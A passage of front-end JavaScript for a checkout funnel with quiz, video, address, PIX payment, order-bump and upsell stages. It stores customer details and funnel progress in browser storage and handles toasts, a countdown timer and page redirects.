    element.setAttribute('aria-hidden', shouldHide ? 'true' : 'false');
}

function showInlineError(container, message) {
    if (!container) {
        showToast(message, 'error');
        return;
    }
    container.textContent = message;
    container.classList.remove('hidden');
}

function clearInlineError(container) {
    if (!container) return;
    container.textContent = '';
    container.classList.add('hidden');
}

function resetCepResults(errorBox, addressResult, freightBox, btnBuscar, loadingRow) {
    clearInlineError(errorBox);
    setHidden(addressResult, true);
    setHidden(freightBox, true);
    setHidden(loadingRow, true);
    btnBuscar?.classList.remove('hidden');
}

function focusFirstControl(container) {
    if (!container) return;
    const focusTarget = container.querySelector('input, button, select, textarea');
    if (focusTarget) {
        setTimeout(() => focusTarget.focus(), 50);
    }
}

function startTimer(duration, display) {
    if (!display) return;
    if (state.timerId) clearInterval(state.timerId);
    let timer = duration;

    state.timerId = setInterval(() => {
        const minutes = String(Math.floor(timer / 60)).padStart(2, '0');
        const seconds = String(timer % 60).padStart(2, '0');
        display.textContent = `${minutes}:${seconds}`;

        if (timer > 0) {
            timer -= 1;
        }
    }, 1000);
}

function showToast(message, type = 'info') {
    if (!dom.toast) {
        alert(message);
        return;
    }

    dom.toast.textContent = message;
    dom.toast.classList.remove('hidden', 'toast--success', 'toast--error', 'toast--info');

    if (type === 'success') dom.toast.classList.add('toast--success');
    if (type === 'error') dom.toast.classList.add('toast--error');

    requestAnimationFrame(() => {
        dom.toast.classList.add('toast--show');
    });

    if (state.toastTimeout) clearTimeout(state.toastTimeout);
    state.toastTimeout = setTimeout(() => {
        dom.toast.classList.remove('toast--show');
        setTimeout(() => dom.toast.classList.add('hidden'), 200);
    }, 2800);
}

function savePersonal(data) {
    localStorage.setItem(STORAGE_KEYS.personal, JSON.stringify(data));
}

function loadPersonal() {
    try {
        const raw = localStorage.getItem(STORAGE_KEYS.personal);
        return raw ? JSON.parse(raw) : null;
    } catch (error) {
        return null;
    }
}

function saveAddress(data) {
    localStorage.setItem(STORAGE_KEYS.address, JSON.stringify(data));
}

function loadAddress() {
    try {
        const raw = localStorage.getItem(STORAGE_KEYS.address);
        return raw ? JSON.parse(raw) : null;
    } catch (error) {
        return null;
    }
}

function saveQuizComplete() {
    localStorage.setItem(STORAGE_KEYS.quizComplete, 'true');
}

function setStage(stage) {
    if (!stage) return;
    localStorage.setItem(STORAGE_KEYS.stage, stage);
}

function getStage() {
    return localStorage.getItem(STORAGE_KEYS.stage) || '';
}

function resetFlow() {
    localStorage.removeItem(STORAGE_KEYS.personal);
    localStorage.removeItem(STORAGE_KEYS.address);
    localStorage.removeItem(STORAGE_KEYS.quizComplete);
    localStorage.removeItem(STORAGE_KEYS.stage);
    localStorage.removeItem(STORAGE_KEYS.shipping);
    localStorage.removeItem(STORAGE_KEYS.addressExtra);
    localStorage.removeItem(STORAGE_KEYS.pix);
    localStorage.removeItem(STORAGE_KEYS.bump);
    localStorage.removeItem(STORAGE_KEYS.vslCompleted);
    sessionStorage.removeItem(STORAGE_KEYS.stock);
    sessionStorage.removeItem(STORAGE_KEYS.returnTo);
    sessionStorage.removeItem(STORAGE_KEYS.directCheckout);
    clearCoupon();
}

function markVslCompleted() {
    localStorage.setItem(STORAGE_KEYS.vslCompleted, '1');
}

function isVslCompleted() {
    return localStorage.getItem(STORAGE_KEYS.vslCompleted) === '1';
}

function isPixPaid(pix) {
    if (!pix || typeof pix !== 'object') return false;
    if (pix.upsellPaid === true) return true;
    const status = String(pix.status || pix.statusRaw || '').toLowerCase();
    return /paid|approved|confirm|completed|success|conclu|aprov/.test(status);
}

function resolveResumeUrl() {
    const stage = getStage();

    if (stage === 'quiz') return 'quiz';
    if (stage === 'personal') return 'dados';
    if (stage === 'cep') return 'endereco';
    if (stage === 'processing') return 'processando';
    if (stage === 'success') return 'sucesso';
    if (stage === 'checkout') return 'checkout';
    if (stage === 'orderbump') return 'orderbump';
    if (stage === 'pix') return 'pix';
    if (stage === 'upsell') return 'upsell';
    if (stage === 'complete') return 'checkout';
    if (loadPersonal() && !loadAddress()) return 'endereco';
    if (loadPersonal() && loadAddress()) return 'checkout';

    return null;
}

function getReturnTarget() {
    const params = new URLSearchParams(window.location.search);
    const queryReturn = params.get('return');
    if (queryReturn) {
        sessionStorage.setItem(STORAGE_KEYS.returnTo, queryReturn);
        return queryReturn;
    }
    return sessionStorage.getItem(STORAGE_KEYS.returnTo) || '';
}

function isDirectCheckoutMode() {
    const params = new URLSearchParams(window.location.search || '');
    if (params.get('dc') === '1') {
        sessionStorage.setItem(STORAGE_KEYS.directCheckout, '1');
        return true;
    }
    return sessionStorage.getItem(STORAGE_KEYS.directCheckout) === '1';
}

function requirePersonal() {
    if (isDirectCheckoutMode()) return true;
    const personal = loadPersonal();
    if (!personal || !personal.name || !personal.cpf || !personal.birth || !personal.email || !personal.phone) {
        redirect('dados.html');
        return false;
    }
    return true;
}

function requireAddress() {
    if (isDirectCheckoutMode()) return true;
    if (!loadAddress()) {
        redirect('endereco.html');
        return false;
    }
    return true;
}

function redirect(url) {
    let target = toRootRelativePath(url || '');
    if (!target) return;

    const currentPath = normalizeBackRedirectPath(`${window.location.pathname}${window.location.search || ''}`);
    const targetPath = normalizeBackRedirectPath(target);
    if (targetPath && currentPath && targetPath === currentPath) {
        try {
            const parsed = new URL(target, window.location.origin);
            parsed.searchParams.set('br', String(Date.now()));
            target = `${parsed.pathname}${parsed.search}${parsed.hash}`;
        } catch (_error) {
            target = `${target}${target.includes('?') ? '&' : '?'}br=${Date.now()}`;
        }
    }

    window.__ifbAllowUnload = true;
    window.location.href = target;
}

